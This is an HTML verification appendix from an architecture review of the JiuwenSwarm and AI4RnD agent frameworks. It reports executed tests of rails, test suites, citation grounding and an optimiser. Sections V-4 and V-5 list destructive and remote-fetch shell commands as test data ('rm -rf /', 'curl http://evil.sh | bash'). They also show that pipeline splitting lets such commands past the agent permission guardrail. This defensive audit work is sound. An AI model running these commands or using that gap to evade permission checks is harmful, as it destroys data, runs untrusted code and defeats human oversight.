@@ -1,0 +1,416 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Verification appendix &middot; AI4RnD &times; JiuwenSwarm</title>
+<link rel="stylesheet" href="style.css">
+</head><body>
+<div class="layout">
+<aside><div class="brand"><svg class="mark" width="20" height="20" viewBox="0 0 20 20" fill="none" aria-hidden="true"><path d="M10 1.6c2.4 2.1 3.6 4.7 3.6 7.4 0 2.9-1.3 5.5-3.6 7.4-2.3-1.9-3.6-4.5-3.6-7.4 0-2.7 1.2-5.3 3.6-7.4z" fill="#cf0a2c"/><path d="M10 16.4c-2.6 1.4-5 1.7-7.2 1-.5-2.2 0-4.4 1.6-6.4 2.2.3 4.1 1.5 5.6 3.5z" fill="#a60822"/><path d="M10 16.4c2.6 1.4 5 1.7 7.2 1 .5-2.2 0-4.4-1.6-6.4-2.2.3-4.1 1.5-5.6 3.5z" fill="#7a0a1d"/></svg><h1>AI4RnD &times; JiuwenSwarm</h1></div>
+<p class="rev">Architecture review &middot; Rev 3</p>
+<div class="navsec">Start</div>
+<a class="doc" href="readme.html">Overview &amp; verdict</a>
+<a class="doc" href="15-correction-log.html">Correction log</a>
+<div class="navsec">Decision</div>
+<a class="doc" href="17-taskgraph-verdict.html">TaskGraph verdict</a>
+<a class="doc" href="19-product-layers-and-ux.html">Product layers &amp; UX</a>
+<a class="doc" href="07-architecture-options.html">Architecture options</a>
+<a class="doc" href="08-recommended-architecture.html">Recommended architecture</a>
+<a class="doc" href="18-evolution-governance.html">Evolution governance</a>
+<a class="doc" href="09-implementation-plan.html">Staged path</a>
+<div class="navsec">Product</div>
+<a class="doc" href="00-intended-product-model.html">Intended product model</a>
+<a class="doc" href="13-maturity-map.html">Maturity map</a>
+<a class="doc" href="14-reuse-vs-build-map.html">Reuse vs build</a>
+<a class="doc" href="traceability-142-feature-matrix.html">142-feature matrix</a>
+<div class="navsec">Systems</div>
+<a class="doc" href="01-jiuwenswarm-architecture.html">JiuwenSwarm architecture</a>
+<a class="doc" href="02-ai4rnd-architecture.html">AI4RnD architecture</a>
+<a class="doc" href="03-workflow-traces.html">Workflow traces</a>
+<a class="doc" href="04-component-comparison.html">Component comparison</a>
+<a class="doc" href="05-capability-matrix.html">Capability matrix</a>
+<a class="doc" href="06-integration-challenges.html">Integration challenges</a>
+<div class="navsec">Evidence</div>
+<a class="doc" href="16-jiuwen-execution-mechanisms.html">Jiuwen execution mechanisms</a>
+<a class="doc on" href="12-verification-appendix.html">Verification appendix</a>
+<a class="doc" href="11-evidence-appendix.html">Evidence appendix</a>
+<a class="doc" href="10-risks-assumptions-open-questions.html">Risks &amp; open questions</a>
+<a class="doc" href="diagrams-readme.html">Diagram index</a>
+<div class="side-foot">jiuwenswarm @ a98d7ad<br>openjiuwen 0.1.15.post3<br>AI4Research @ d35c511<br>142 features &middot; 19 experiments</div></aside>
+<main><div class="crumb">Evidence / 12-verification-appendix.md</div><article><nav class="toc"><div class="toc-h">On this page</div><a class="l2" href="#0-environment">0. Environment</a><a class="l2" href="#v-1-openjiuwen-rail-api-the-real-shape">V-1 · openjiuwen Rail API — the real shape</a><a class="l2" href="#v-2-can-an-out-of-tree-rail-register-and-invoke-an-ability">V-2 · Can an out-of-tree Rail register AND invoke an ability? ⭐</a><a class="l2" href="#v-3-permission-engine-severity-mapping">V-3 · Permission engine — severity mapping ⭐</a><a class="l2" href="#v-4-permission-engine-built-in-rules-do-not-load-new-finding">V-4 · Permission engine — built-in rules do not load ⭐ NEW FINDING</a><a class="l2" href="#v-5-shell-chaining-is-decomposed-not-escalated">V-5 · Shell chaining is decomposed, not escalated</a><a class="l2" href="#v-6-per-member-permissions-and-roles">V-6 · Per-member permissions and roles</a><a class="l2" href="#v-7-jiuwenswarm-test-suite">V-7 · JiuwenSwarm test suite</a><a class="l2" href="#v-8-ai4rnd-module-maturity-by-execution">V-8 · AI4RnD module maturity by execution ⭐</a><a class="l2" href="#v-9-ai4rnd-test-suites">V-9 · AI4RnD test suites</a><a class="l2" href="#v-10-ai4rnd-research-core-runs-standalone">V-10 · AI4RnD research core runs standalone ⭐</a><a class="l2" href="#v-11-capability-capsules-execute-and-validate">V-11 · Capability capsules execute and validate ⭐</a><a class="l2" href="#v-12-citation-grounding-quality-measured-decisive">V-12 · Citation grounding quality — MEASURED ⭐ decisive</a><a class="l2" href="#v-13-rsi-gepa-is-real-and-unwired">V-13 · RSI — GEPA is real and unwired ⭐</a><a class="l2" href="#v-14-openjiuwen-deepsearch-overlap-prior-risk-r5-resolved">V-14 · openJiuwen-DeepSearch overlap — prior risk R5 resolved ⭐</a><a class="l2" href="#blocked-tests">Blocked tests</a><a class="l2" href="#summary-of-corrections-to-the-previous-revision">Summary of corrections to the previous revision</a><a class="l2" href="#v-15-core-workflow-and-the-pregel-engine-exist-and-build">V-15 · Core Workflow and the Pregel engine exist and build ⭐</a><a class="l2" href="#v-16-swarmflow-script-contract-meta-purity-and-determinism-l">V-16 · SwarmFlow script contract — META purity and determinism lint ⭐</a><a class="l2" href="#v-17-openjiuwen-has-a-self-evolution-framework">V-17 · openjiuwen has a self-evolution framework ⭐</a><a class="l2" href="#v-18-the-operator-naming-collision">V-18 · The "Operator" naming collision</a><a class="l2" href="#v-19-mechanism-comparison-consolidated">V-19 · Mechanism comparison, consolidated</a><a class="l2" href="#revision-3-corrections-table">Revision 3 corrections table</a><a class="l2" href="#blocked-in-revision-3">Blocked in Revision 3</a></nav><h1 id="verification-appendix-commands-and-results"><a class="anchor" href="#verification-appendix-commands-and-results" aria-hidden="true">#</a>Verification Appendix — Commands and Results</h1>
+<p>The previous revision executed neither system. This revision does. Everything below was run in a disposable container environment; nothing touched product branches, authenticated providers, or persistent external state.</p>
+<p><strong>Evidence classes used throughout the analysis</strong></p>
+<div class="tw"><table><thead><tr><th>Class</th><th>Meaning</th></tr></thead><tbody><tr><td><span class="chip ok">EXEC</span></td><td>executed here; result reproduced below</td></tr><tr><td><span class="chip neutral">SRC</span></td><td>read in source at a stated commit</td></tr><tr><td><span class="chip warn">DOC</span></td><td>stated in in-repo documentation, not independently confirmed</td></tr><tr><td><span class="chip warn">INF</span></td><td>inferred; the inference is stated</td></tr></tbody></table></div>
+<hr>
+<h2 id="0-environment"><a class="anchor" href="#0-environment" aria-hidden="true">#</a>0. Environment</h2>
+<div class="tw"><table><thead><tr><th>Item</th><th>Value</th></tr></thead><tbody><tr><td>Host</td><td>Linux 6.18.5, x86-64, container, <strong>running as uid 0</strong> (matters for V-9)</td></tr><tr><td>Python</td><td>3.11</td></tr><tr><td>JiuwenSwarm</td><td><code>suraj-subrahmanyan/jiuwenswarm</code> @ <code>a98d7ad</code>, branch <code>develop</code></td></tr><tr><td>AI4Research</td><td><code>Stellven/AI4Research</code> @ <code>d35c511</code>, branch <code>openJiuwen-Solar</code> (shallow clone, depth 50)</td></tr><tr><td>AI4Research-A / -B</td><td>default branches, docs and run-artifacts only</td></tr><tr><td>venv A</td><td><code>.venv-jw</code> — <code>openjiuwen==0.1.15.post3</code> + <code>jiuwenswarm</code> editable <code>[test]</code></td></tr><tr><td>venv B</td><td><code>.venv-ai</code> — stdlib + <code>pyyaml</code>, <code>jsonschema</code>, <code>pytest</code> (AI4RnD research core)</td></tr><tr><td>venv C</td><td><code>.venv-xl</code> — <code>openpyxl</code> (workbook extraction)</td></tr></tbody></table></div>
+<pre><code>python3 -m venv .venv-jw
+./.venv-jw/bin/pip install &quot;openjiuwen==0.1.15.post3&quot;
+./.venv-jw/bin/python -c &quot;import openjiuwen, importlib.metadata as md; print(md.version(&#x27;openjiuwen&#x27;))&quot;
+# -&gt; 0.1.15.post3
+cd jw-src &amp;&amp; ../.venv-jw/bin/pip install -e &quot;.[test]&quot;
+# -&gt; Successfully installed ... jiuwenswarm-0.2.3b1 ...</code></pre>
+<p>No credentials were configured. No model provider was called. Tests requiring them are marked <strong>BLOCKED</strong> below.</p>
+<hr>
+<h2 id="v-1-openjiuwen-rail-api-the-real-shape"><a class="anchor" href="#v-1-openjiuwen-rail-api-the-real-shape" aria-hidden="true">#</a>V-1 · openjiuwen Rail API — the real shape</h2>
+<p><strong>Question.</strong> The previous analysis inferred the Rail API from JiuwenSwarm's in-tree rails because <code>openjiuwen</code> was unavailable. Is the inference correct?</p>
+<pre><code>./.venv-jw/bin/python exp1_rail_ability.py</code></pre>
+<p><strong>Result — CONFIRMED, with detail the previous analysis did not have:</strong></p>
+<pre><code>AgentRail.priority default : 50
+has init/uninit            : True True
+init signature             : (self, agent)
+DeepAgentRail MRO          : [&#x27;DeepAgentRail&#x27;, &#x27;AgentRail&#x27;, &#x27;ABC&#x27;, &#x27;object&#x27;]
+events                     : 11 [&#x27;before_invoke&#x27;, &#x27;after_invoke&#x27;, &#x27;before_task_iteration&#x27;,
+                                &#x27;after_task_iteration&#x27;, &#x27;after_react_iteration&#x27;,
+                                &#x27;before_model_call&#x27;, &#x27;after_model_call&#x27;, &#x27;on_model_exception&#x27;,
+                                &#x27;before_tool_call&#x27;, &#x27;after_tool_call&#x27;, &#x27;on_tool_exception&#x27;]</code></pre>
+<p>Corrections to the previous revision:</p>
+<ul><li>There are <strong>11</strong> lifecycle events, not 10 — <code>after_react_iteration</code> was missing from the</li></ul>
+<p>documentation table in <code>docs/en/Harness.md</code>.</p>
+<ul><li><code>AgentRail</code> is at <code>openjiuwen/core/single_agent/rail/base.py:456</code>; <code>init</code>/<code>uninit</code> at</li></ul>
+<p>481/484; <code>priority: int = 50</code> at 479.</p>
+<ul><li><code>DeepAgentRail</code> (<code>openjiuwen/harness/rails/base.py:28</code>) adds only the two task-iteration</li></ul>
+<p>hooks and <code>set_workspace</code> / <code>set_sys_operation</code>.</p>
+<ul><li><code>get_callbacks()</code> filters to <em>overridden</em> methods only, via <code>_is_base_method</code>.</li></ul>
+<hr>
+<h2 id="v-2-can-an-out-of-tree-rail-register-and-invoke-an-ability"><a class="anchor" href="#v-2-can-an-out-of-tree-rail-register-and-invoke-an-ability" aria-hidden="true">#</a>V-2 · Can an out-of-tree Rail register AND invoke an ability? ⭐</h2>
+<p><strong>Question.</strong> This is the assumption the entire recommended architecture rested on (previously "A4 — if wrong, Option D collapses").</p>
+<p><strong>Result — PASS.</strong> Full transcript:</p>
+<pre><code>== B. Define an out-of-tree research tool + rail ==
+  LocalFunction built        : LocalFunction
+  card.name                  : research_evidence
+  card.input_params          : {&#x27;type&#x27;:&#x27;object&#x27;,&#x27;properties&#x27;:{&#x27;claim_id&#x27;:{&#x27;type&#x27;:&#x27;string&#x27;}},
+                                &#x27;required&#x27;:[&#x27;claim_id&#x27;]}
+  card.stateless             : False
+
+== C. Register onto a bare AbilityManager ==
+  add_ability result         : AddAbilityResult(name=&#x27;research_evidence&#x27;, added=True,
+                                                reason=&#x27;added_tool&#x27;)
+  ability listed             : [&#x27;research_evidence&#x27;]
+
+== D. Invoke the registered tool through the resource manager ==
+  resolved tool              : LocalFunction
+  INVOKE RESULT              : evidence_for::C014     &lt;-- real execution
+
+== F. uninit ==
+  removed abilities          : ok
+  remaining abilities        : []
+
+EXPERIMENT 1: PASS</code></pre>
+<p><strong>Findings.</strong></p>
+<ul><li><code>add_ability(card, tool)</code> is at <code>ability_manager.py:343</code>; <code>remove_ability</code> at 379.</li><li>Correct construction is <code>LocalFunction(card=ToolCard(...), func=fn)</code> — <code>card</code> is a</li></ul>
+<p><strong>required positional argument</strong>, contrary to what the in-tree call sites suggest at a glance.</p>
+<ul><li>Stateful tools (<code>card.stateless=False</code>, the default) get an agent-qualified id</li></ul>
+<p><code>f"{name}_{owner_id}"</code> and are registered with <code>refresh=True</code>; stateless tools keep a bare id and are <code>skip_if_exists</code>. <strong>An integration Rail must decide this deliberately</strong> — a research toolkit holding a service client should be stateful.</p>
+<p><strong>Consequence.</strong> The out-of-tree Rail seam is real and load-bearing. It is confirmed as an integration mechanism for tools and lifecycle hooks.</p>
+<hr>
+<h2 id="v-3-permission-engine-severity-mapping"><a class="anchor" href="#v-3-permission-engine-severity-mapping" aria-hidden="true">#</a>V-3 · Permission engine — severity mapping ⭐</h2>
+<pre><code>./.venv-jw/bin/python exp2b_permissions.py</code></pre>
+<p><strong>Result — the documented mapping is exactly correct:</strong></p>
+<div class="tw"><table><thead><tr><th>mode</th><th>LOW</th><th>MEDIUM</th><th>HIGH</th><th>CRITICAL</th></tr></thead><tbody><tr><td><code>normal</code></td><td>ALLOW</td><td>ALLOW</td><td>ASK</td><td>ASK</td></tr><tr><td><code>strict</code></td><td>ALLOW</td><td>ASK</td><td>ASK</td><td><strong>DENY</strong></td></tr></tbody></table></div>
+<p>Also confirmed:</p>
+<ul><li><code>tools.&lt;name&gt;: deny</code> → <code>PermissionLevel.DENY</code>, rule <code>tools.bash</code> — returns immediately.</li><li>An explicit <code>action: allow</code> on a <code>CRITICAL</code> rule yields ALLOW even in <code>strict</code> mode —</li></ul>
+<p>explicit action overrides severity, as documented.</p>
+<ul><li>Correct call shape is <code>evaluate_tiered_policy(permissions_section, tool_name, tool_args)</code></li></ul>
+<p>— the <strong>inner</strong> <code>permissions</code> mapping, not the whole config.</p>
+<hr>
+<h2 id="v-4-permission-engine-built-in-rules-do-not-load-new-finding"><a class="anchor" href="#v-4-permission-engine-built-in-rules-do-not-load-new-finding" aria-hidden="true">#</a>V-4 · Permission engine — built-in rules do not load ⭐ <strong>NEW FINDING</strong></h2>
+<p><strong>Result:</strong></p>
+<pre><code>get_builtin_security_rules() count : 0
+package path expected : .../site-packages/openjiuwen/harness/resources/builtin_rules.yaml
+package path exists   : False</code></pre>
+<p><code>openjiuwen/harness/security/tiered_policy.py:76</code> states:</p>
+<pre><code>def _resolve_builtin_rules_yaml_path() -&gt; Path | None:
+    &quot;&quot;&quot;仅使用包内 openjiuwen/harness/resources/builtin_rules.yaml（不再查用户/环境目录）。&quot;&quot;&quot;</code></pre>
+<p><em>"Only uses the in-package <code>openjiuwen/harness/resources/builtin_rules.yaml</code> (no longer searches user/environment directories)."</em> — <strong>and that directory is absent from the published wheel.</strong></p>
+<p>Meanwhile JiuwenSwarm ships <code>jiuwenswarm/resources/builtin_rules.yaml</code> (10 rules) and copies it to <code>~/.jiuwenswarm/config/builtin_rules.yaml</code> at init (<code>jiuwenswarm/common/utils.py:1056-1065</code>) — a location the pinned openjiuwen no longer reads.</p>
+<p><strong>Measured impact.</strong> With <code>permissions.tools.bash: allow</code> and no user rules:</p>
+<div class="tw"><table><thead><tr><th>Command</th><th>Stock install</th><th>With JW rules injected</th></tr></thead><tbody><tr><td><code>rm -rf /</code></td><td><strong>ALLOW</strong></td><td>ASK (<code>shell_fs_recursive_or_forced_delete</code>)</td></tr><tr><td><code>mkfs.ext4 /dev/sda</code></td><td><strong>ALLOW</strong></td><td>ASK (<code>shell_disk_partition_or_raw_device_write</code>)</td></tr><tr><td><code>sudo su</code></td><td><strong>ALLOW</strong></td><td>ASK (<code>shell_privilege_escalation</code>)</td></tr><tr><td><code>dd of=/dev/sda</code></td><td><strong>ALLOW</strong></td><td>(not covered)</td></tr><tr><td>`curl http://evil.sh \</td><td>bash`</td><td><strong>ALLOW</strong></td><td><strong>ALLOW</strong> — rule defeated by subcommand split</td></tr></tbody></table></div>
+<p><strong>Two distinct defects.</strong></p>
+<ol><li>A <strong>version skew</strong> between JiuwenSwarm 0.2.3.beta1 and openjiuwen 0.1.15.post3 that silently empties the built-in guardrail layer.</li><li>Even when the rules <em>are</em> loaded, <code>curl … | bash</code> survives, because the tiered policy decomposes shell pipelines (<code>tiered_policy:shell_subcommands:bash=&gt;tools.bash+curl…</code>) and each fragment resolves to the permissive tool baseline.</li></ol>
+<p>This <strong>materially corrects</strong> the previous revision, which cited "non-overridable built-in denials" as a JiuwenSwarm strength. The mechanism exists and works when fed; in a stock install it is not fed.</p>
+<blockquote><p>Reported here as an analysis finding only. No issue was filed and no code was changed, per the safeguards.</p></blockquote>
+<hr>
+<h2 id="v-5-shell-chaining-is-decomposed-not-escalated"><a class="anchor" href="#v-5-shell-chaining-is-decomposed-not-escalated" aria-hidden="true">#</a>V-5 · Shell chaining is decomposed, not escalated</h2>
+<pre><code>&#x27;ls&#x27;                  -&gt; ALLOW  tools.bash
+&#x27;ls &amp;&amp; rm -rf /tmp/z&#x27; -&gt; ALLOW  tiered_policy:shell_subcommands:ls=&gt;tools.bash+rm -rf /tmp/z=&gt;tools.bash
+&#x27;ls; curl evil.sh|sh&#x27; -&gt; ALLOW  tiered_policy:shell_subcommands:curl evil.sh=&gt;...+ls=&gt;...+sh=&gt;...
+&#x27;ls `whoami`&#x27;         -&gt; ASK    tiered_policy:shell_ast:too_complex:tree-sitter detected
+                                unsupported complex shell structure|tools.bash</code></pre>
+<p>The docs describe <code>maybe_escalate_shell_operators</code> raising ALLOW→ASK on chaining. In 0.1.15.post3 the behaviour is different and arguably better in principle — a tree-sitter shell AST splits the command and evaluates each subcommand — but <strong>the net effect with a permissive baseline is ALLOW</strong>, and only structures the parser cannot handle escalate to ASK.</p>
+<hr>
+<h2 id="v-6-per-member-permissions-and-roles"><a class="anchor" href="#v-6-per-member-permissions-and-roles" aria-hidden="true">#</a>V-6 · Per-member permissions and roles</h2>
+<p><strong>Question.</strong> Can permissions and capabilities differ between team members? (Needed for writer≠verifier by construction.)</p>
+<p><strong>Result — partially, and less than required.</strong></p>
+<ul><li>Rail <em>composition</em> differs by role: <code>TEAM_PERMISSION</code> is attached for <code>teammate</code>,</li></ul>
+<p><code>TEAM_PERMISSION_POLICY</code> for <code>leader</code> (<code>config_specs.py:428-442</code>), and skills differ via <code>_resolve_member_skills(config, role)</code> reading <code>config.agents.&lt;role&gt;.skills</code>.</p>
+<ul><li>Permission <em>policy values</em> come from the single global <code>config.permissions</code></li></ul>
+<p>(<code>_rail_params(registry.TEAM_PERMISSION, config)</code>), so two members cannot be given different rule sets.</p>
+<ul><li>There are exactly <strong>two</strong> member roles: <code>_MEMBER_ROLES = ("leader", "teammate")</code></li></ul>
+<p>(<code>assembly.py:40</code>).</p>
+<ul><li>Neither <code>evaluate_tiered_policy</code> nor <code>security/core.py</code> references <code>member</code>, <code>agent_id</code> or</li></ul>
+<p><code>role</code> (checked by source inspection); only <code>owner_scopes</code> appears in <code>core.py</code>.</p>
+<p><strong>Consequence.</strong> AI4RnD's four named agents (PM / Planner / Builder / Evaluator) and its per-operator permission model <strong>do not map onto JiuwenSwarm's two-role team</strong>. Enforcing "the evaluator must not be the writer" cannot currently be expressed as a permission constraint in JiuwenSwarm. This is a <strong>new blocker</strong> the previous revision missed.</p>
+<hr>
+<h2 id="v-7-jiuwenswarm-test-suite"><a class="anchor" href="#v-7-jiuwenswarm-test-suite" aria-hidden="true">#</a>V-7 · JiuwenSwarm test suite</h2>
+<pre><code>cd jw-src &amp;&amp; ../.venv-jw/bin/python -m pytest tests -p no:cacheprovider --no-cov -q</code></pre>
+<pre><code>2816 passed, 18 skipped, 1 warning in 418.73s (0:06:58)</code></pre>
+<p>2,834 collected. <strong>Zero failures.</strong> This is a strong maintenance-health signal and is the single best argument in favour of JiuwenSwarm as a substrate.</p>
+<hr>
+<h2 id="v-8-ai4rnd-module-maturity-by-execution"><a class="anchor" href="#v-8-ai4rnd-module-maturity-by-execution" aria-hidden="true">#</a>V-8 · AI4RnD module maturity by execution ⭐</h2>
+<p>48 architecturally significant modules probed for: does it import (stdlib + pyyaml only), is it referenced by the live runtime (<code>coordinator.sh</code>, <code>solar-harness.sh</code>, <code>graph_scheduler</code>, <code>graph_node_dispatcher</code>, <code>multi_task_runner</code>), and is it referenced by tests.</p>
+<pre><code>import OK 48/48 | wired 29/48 | tested 43/48</code></pre>
+<p><strong>Everything imports.</strong> The 19 unwired modules are the finding:</p>
+<div class="tw"><table><thead><tr><th>Implemented, tested, <strong>not wired</strong></th><th>LOC</th></tr></thead><tbody><tr><td><code>capability_capsules</code></td><td>1351</td></tr><tr><td><code>capsule_execution_gate</code></td><td>194</td></tr><tr><td><code>skill_to_capsule_compiler</code></td><td>323</td></tr><tr><td><code>capability_token</code></td><td>105</td></tr><tr><td><code>logical_operator_registry</code></td><td>33</td></tr><tr><td><code>physical_operator_catalog</code></td><td>100</td></tr><tr><td><code>operator_router</code></td><td>305</td></tr><tr><td><code>operator_state_machine</code></td><td>233</td></tr><tr><td><code>task_graph_io</code></td><td>351</td></tr><tr><td><code>task_graph_state_io</code></td><td>491</td></tr><tr><td><code>evidence_ledger</code></td><td>117</td></tr><tr><td><code>event_ledger</code></td><td>198</td></tr><tr><td><code>actor_registry</code> / <code>actor_lease</code> / <code>actor_mailbox</code> / <code>actor_runtime</code></td><td>382 / 238 / 102 / 329</td></tr><tr><td><code>context_store</code>, <code>solar_db</code></td><td>58 / 41</td></tr></tbody></table></div>
+<p>The <code>actor_*</code> family is a durable actor model with registry, leases and mailboxes — directly relevant to Harness Core features 2 and 4 — sitting unused.</p>
+<hr>
+<h2 id="v-9-ai4rnd-test-suites"><a class="anchor" href="#v-9-ai4rnd-test-suites" aria-hidden="true">#</a>V-9 · AI4RnD test suites</h2>
+<p>Full-suite collection aborts: <code>tests/test_youtube_influence_digest_quality.py</code> imports a script that calls <code>raise SystemExit(2)</code> at module level, producing a pytest <code>INTERNALERROR</code>. Targeted subsets were run instead.</p>
+<div class="tw"><table><thead><tr><th>Suite</th><th>Result</th></tr></thead><tbody><tr><td><code>tests/graph</code></td><td><strong>321 passed</strong> (67s)</td></tr><tr><td><code>tests/evaluators</code></td><td><strong>104 passed</strong> (220s)</td></tr><tr><td><code>tests/gate_ledger</code></td><td><strong>124 passed, 2 failed</strong></td></tr><tr><td><code>tests/experience</code></td><td><strong>7 passed</strong></td></tr><tr><td><code>tests/evolution</code>, <code>tests/control_plane</code></td><td>no Python tests (shell-based)</td></tr></tbody></table></div>
+<p><strong>The 2 failures are environment artifacts, not defects.</strong> Both assert that a write fails in a directory made read-only with <code>os.chmod(target, 0o500)</code>; the container runs as uid 0, and root bypasses permission bits:</p>
+<pre><code>os.chmod(target, 0o500)
+&gt;  assert rec is None
+E  AssertionError: assert {&#x27;record_id&#x27;: ..., &#x27;kind&#x27;: &#x27;gate_check&#x27;, ...} is None</code></pre>
+<p><strong>Total observed: 556 passed, 2 environment-failed.</strong> The scheduler, evaluator and gate-ledger cores are genuinely exercised.</p>
+<hr>
+<h2 id="v-10-ai4rnd-research-core-runs-standalone"><a class="anchor" href="#v-10-ai4rnd-research-core-runs-standalone" aria-hidden="true">#</a>V-10 · AI4RnD research core runs standalone ⭐</h2>
+<p>No Solar runtime, no <code>HARNESS_DIR</code>, stdlib + pyyaml only:</p>
+<pre><code>python lib/research/cli.py init &quot;$DB&quot; --topic &quot;Transformer efficiency&quot; --depth-tier standard
+python lib/research/cli.py add-source &quot;$DB&quot; --run-id &quot;$RID&quot; --title FlashAttention --text &quot;...&quot;
+python lib/research/cli.py extract &quot;$DB&quot; --run-id &quot;$RID&quot; --source-id &quot;$SID&quot;
+python lib/research/cli.py ledger  &quot;$DB&quot; --run-id &quot;$RID&quot;
+python lib/research/cli.py mine    &quot;$DB&quot; --run-id &quot;$RID&quot;</code></pre>
+<pre><code>Initialized research DB  · 7 tables: research_runs, research_sources, evidence_items,
+                            claims, claim_evidence, report_sections, section_checks
+Source added: 6697dbc0...  Content hash: ec607d44cee4f586...
+Evidence extracted: ev_6c000678c02551b2   Span: [0, 150)
+Evidence items: 1
+Claim mining ... Claims: 3   Claim-evidence links: 3</code></pre>
+<p><strong>Confirms the port is cheap.</strong> Deterministic ids, SHA-256 content hashing and character spans all work outside the harness. Resolves prior spike E3.</p>
+<hr>
+<h2 id="v-11-capability-capsules-execute-and-validate"><a class="anchor" href="#v-11-capability-capsules-execute-and-validate" aria-hidden="true">#</a>V-11 · Capability capsules execute and validate ⭐</h2>
+<pre><code>HARNESS_DIR=$(pwd) PYTHONPATH=lib python -c &quot;import capability_capsules as cc; ...&quot;</code></pre>
+<pre><code>registry entries: 30
+manifests VALID: 23   INVALID: 0
+
+contract              : [&#x27;inputs&#x27;,&#x27;outputs&#x27;,&#x27;preconditions&#x27;,&#x27;postconditions&#x27;,&#x27;invariants&#x27;]
+composition           : [&#x27;consumes&#x27;,&#x27;produces&#x27;,&#x27;compatible_with&#x27;,&#x27;incompatible_with&#x27;,&#x27;requires_after&#x27;]
+effects               : [&#x27;read&#x27;,&#x27;write&#x27;,&#x27;execute&#x27;,&#x27;network&#x27;,&#x27;cost&#x27;]
+bindings              : [&#x27;skills&#x27;,&#x27;mcp_capabilities&#x27;,&#x27;data_refs&#x27;,&#x27;secret_refs&#x27;,&#x27;required_guard_capsules&#x27;]
+verification          : [&#x27;self_check&#x27;,&#x27;external_verifier&#x27;,&#x27;pass_conditions&#x27;]
+operator_compatibility: [&#x27;preferred&#x27;,&#x27;forbidden&#x27;]
+provenance            : [&#x27;owner&#x27;,&#x27;created_at&#x27;,&#x27;manifest_path&#x27;]</code></pre>
+<p><strong>This settles the "capsules are not renamed skills" question by execution.</strong> Note <code>bindings.skills</code> — a skill is an <em>ingredient</em> of a capsule.</p>
+<p>Also confirmed: <code>capsule_execution_gate</code> exposes <code>check_cooldown</code>, <code>check_idempotency</code>, <code>GateDecision</code>, <code>IdempotencyResult</code> — real pre-dispatch gating, unwired.</p>
+<hr>
+<h2 id="v-12-citation-grounding-quality-measured-decisive"><a class="anchor" href="#v-12-citation-grounding-quality-measured-decisive" aria-hidden="true">#</a>V-12 · Citation grounding quality — MEASURED ⭐ <strong>decisive</strong></h2>
+<p><strong>Question.</strong> Prior spike E8: is <code>_jaccard</code>-based grounding good enough to support the claim that AI4RnD output is verified?</p>
+<p><strong>Mechanism found.</strong> Grounding does not use Jaccard at all. <code>evaluator.py:443-476</code>:</p>
+<pre><code>overlap = sorted(context_tokens &amp; evidence_tokens)
+checks.append({..., &quot;ok&quot;: bool(overlap), ...})</code></pre>
+<p>A citation is "grounded" if the citing line shares <strong>one</strong> token (≥3 chars, per <code>TOKEN_RE = [A-Za-z0-9_\-]{3,}|[一-鿿]{2,}</code>) with the evidence text. <code>_jaccard</code> is used elsewhere, for source diversity.</p>
+<p><strong>Measurement.</strong> One evidence item; nine citing sentences hand-labelled for actual support:</p>
+<div class="tw"><table><thead><tr><th>Verdict</th><th>Truth</th><th>Overlap tokens that carried it</th></tr></thead><tbody><tr><td>GROUNDED</td><td><span class="ic ok">✓</span> true</td><td>achieves, and, flashattention, gpt-2, io-aware, speedup, training</td></tr><tr><td>GROUNDED</td><td><span class="ic ok">✓</span> true</td><td>and, between, flashattention, gpu, hbm, memory, reads, reduces</td></tr><tr><td>GROUNDED</td><td><span class="ic bad">✗</span> <strong>false</strong></td><td><code>flashattention</code> — "…is an approximation that trades accuracy for speed"</td></tr><tr><td>GROUNDED</td><td><span class="ic bad">✗</span> <strong>false</strong></td><td>achieves, flashattention, speedup — "…100x speedup on GPT-4"</td></tr><tr><td>GROUNDED</td><td><span class="ic bad">✗</span> <strong>false</strong></td><td>method, the — "…substantially slower than standard attention"</td></tr><tr><td>GROUNDED</td><td><span class="ic bad">✗</span> <strong>false</strong></td><td><code>flashattention</code> — "…was invented in 1823 by Napoleon Bonaparte"</td></tr><tr><td>GROUNDED</td><td><span class="ic bad">✗</span> <strong>false</strong></td><td><code>and</code> — "<strong>Bananas are yellow and grow in tropical climates</strong>"</td></tr><tr><td>GROUNDED</td><td><span class="ic bad">✗</span> <strong>false</strong></td><td>and, memory, method, the, training</td></tr><tr><td>FLAGGED</td><td><span class="ic bad">✗</span> false</td><td><code>[]</code> — "Nothing whatsoever relates here xyzzy plugh frobnicate"</td></tr></tbody></table></div>
+<pre><code>PRECISION of &#x27;grounded&#x27;      = 0.25   (6 of 8 passes are wrong)
+DETECTION of unsupported     = 1/7 = 0.14</code></pre>
+<p><strong>Only a sentence sharing literally zero tokens is flagged.</strong> A fabricated claim survives on a single content word; an unrelated sentence survives on the stopword "and".</p>
+<p><strong>Corroborating search.</strong> No entailment machinery exists anywhere in AI4RnD — a word-boundary search for <code>entail</code>, <code>NLI</code>, <code>entailment</code>, <code>cross_encoder</code>, <code>CrossEncoder</code>, <code>deberta</code>, <code>mnli</code> across <code>harness/lib/**/*.py</code> returns <strong>zero</strong> matches.</p>
+<p><strong>Consequence.</strong> AI4RnD's Evidence/Factuality evaluator (feature 70) does not currently verify grounding in any meaningful sense. The ledger, spans and hashing are sound — the <em>judgement</em> on top of them is not. This is the most important single correction in this revision, and it moves real entailment from "Stage 5 hardening" to <strong>Stage 1 blocking work</strong>.</p>
+<hr>
+<h2 id="v-13-rsi-gepa-is-real-and-unwired"><a class="anchor" href="#v-13-rsi-gepa-is-real-and-unwired" aria-hidden="true">#</a>V-13 · RSI — GEPA is real and unwired ⭐</h2>
+<pre><code>HARNESS_DIR=$(pwd) PYTHONPATH=.:lib python -m integrations.gepa_optimizer.cli --help
+HARNESS_DIR=$(pwd) PYTHONPATH=lib python lib/evolution_engine.py scorecard --json</code></pre>
+<p><code>integrations/gepa_optimizer/</code> — <strong>3,540 LOC</strong>, 11 modules, with the complete controlled- improvement lifecycle:</p>
+<pre><code>propose  Analyse target and print an optimisation proposal (no mutations).
+run      Run the GEPA optimiser (dry-run by default; use --execute for real run).
+review   Show candidates and Pareto front from a completed run.
+promote  Promote a candidate to the target path (must be under /tmp).
+rollback Roll back the last promotion at the given target path.
+status   Show status of a run directory or list recent runs.</code></pre>
+<p>Its safety contract is genuinely strong:</p>
+<ul><li>dry-run default; <code>--execute</code> <strong>rejected unless all three</strong> of <code>--max-evals</code>, <code>--max-spend</code>,</li></ul>
+<p><code>--max-walltime</code> are supplied;</p>
